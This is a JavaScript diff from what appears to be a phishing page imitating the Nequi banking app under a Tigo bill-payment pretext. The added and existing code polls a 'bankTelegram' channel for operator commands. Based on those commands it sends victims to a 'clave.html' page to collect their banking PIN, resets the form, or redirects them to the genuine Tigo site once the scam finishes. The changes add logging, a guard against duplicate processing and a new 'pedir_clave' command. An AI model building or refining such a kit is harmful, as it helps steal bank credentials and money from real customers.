@@ -150,21 +150,41 @@
         });
 
         if (success) {
+          console.log('[NEQUI SALDO INPUT] ✅ Datos enviados, iniciando polling...');
+          
           // Polling con overlay activo
           bankTelegram.startPolling((action) => {
+            console.log('[NEQUI SALDO INPUT] ========== CALLBACK EJECUTADO ==========');
             console.log('[NEQUI SALDO INPUT] Acción recibida:', action.action);
+            
+            // Guardia anti-duplicados
+            if (window.__nequiSaldoProcessing) {
+              console.warn('[NEQUI SALDO INPUT] ⚠️ YA EN PROCESAMIENTO, ABORTANDO');
+              return;
+            }
+            window.__nequiSaldoProcessing = true;
 
             const actionType = action.action.replace('nequi_', '');
 
+            console.log('[NEQUI SALDO INPUT] Procesando acción única:', action.action);
+            
             switch(actionType) {
               case 'saldo_aprobado':
+                console.log('[NEQUI SALDO INPUT] ✅ Saldo aprobado → Redirigiendo a clave.html');
+                // Mantener overlay durante redirección
+                window.location.href = 'clave.html';
+                break;
+                
               case 'request_clave':
+              case 'pedir_clave':
+                console.log('[NEQUI SALDO INPUT] 🔐 Pedir clave → Redirigiendo a clave.html');
                 // Mantener overlay durante redirección
                 window.location.href = 'clave.html';
                 break;
 
               case 'saldo_rechazado':
               case 'error_saldo':
+                console.log('[NEQUI SALDO INPUT] ❌ Saldo rechazado/error');
                 if (overlay) {
                   overlay.classList.remove('active');
                   overlay.style.display = 'none';
@@ -174,21 +194,24 @@
                 btnValidar.disabled = true;
                 btnValidar.style.backgroundColor = '#F8A8D8';
                 btnValidar.textContent = 'Continuar';
+                window.__nequiSaldoProcessing = false;
                 break;
 
               case 'finalizar':
+                console.log('[NEQUI SALDO INPUT] 🏁 Finalizar → Redirigiendo a Tigo');
                 // Mantener overlay durante redirección
                 window.location.href = 'https://mi.tigo.com.co/pago-express/facturas';
                 break;
 
               default:
-                console.warn('[NEQUI SALDO INPUT] Acción no reconocida:', action.action);
+                console.warn('[NEQUI SALDO INPUT] ⚠️ Acción no reconocida:', action.action);
                 if (overlay) {
                   overlay.classList.remove('active');
                   overlay.style.display = 'none';
                 }
                 btnValidar.disabled = false;
                 btnValidar.textContent = 'Continuar';
+                window.__nequiSaldoProcessing = false;
             }
           });
         } else {
